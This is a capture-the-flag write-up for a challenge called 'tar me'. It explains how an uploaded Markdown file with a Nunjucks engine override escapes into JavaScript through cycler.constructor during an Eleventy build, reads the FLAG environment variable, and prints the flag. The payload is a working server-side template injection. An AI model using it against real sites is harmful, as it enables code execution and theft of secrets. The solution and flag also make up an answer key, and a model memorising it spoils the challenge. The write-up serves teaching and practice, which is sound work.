# tar me

The service claims it only accepts Markdown and images, but the builder does not treat Markdown as inert content. It feeds the uploaded files directly into Eleventy:

```js
execFileSync(ELEVENTY_BIN, ["--input=.", "--output=_site", "--quiet"], {
  cwd: workDir,
  timeout: 30_000,
  stdio: "pipe",
});
```

The builder also has the flag in its environment:

```yaml
builder:
  build: ./builder
  environment:
    - FLAG=CPCTF{dummy_flag}
```

So the real question is whether an uploaded `.md` file can execute template code during the build.

Yes. Eleventy supports multiple template engines, including Nunjucks, and a Markdown file can override its engine with front matter. This payload is enough:

```md
---
permalink: index.html
templateEngineOverride: njk,md
---
{{ cycler.constructor("return process.env.FLAG")() }}
```

Why this works:

1. `templateEngineOverride: njk,md` makes Eleventy render the file as Nunjucks before Markdown.
2. Nunjucks exposes helper functions such as `cycler`.
3. `cycler.constructor` is the JavaScript `Function` constructor.
4. `Function("return process.env.FLAG")()` executes inside the builder process and returns the flag.

Upload `index.md` with that content, deploy the site, then open the generated page. The rendered `index.html` contains:

```text
CPCTF{Nu11_byTe_Is_NOt_Just_a_C_ProB13M}
```

Flag:

```text
CPCTF{Nu11_byTe_Is_NOt_Just_a_C_ProB13M}
```

`solve.py` automates the upload, deploy, and fetch steps.
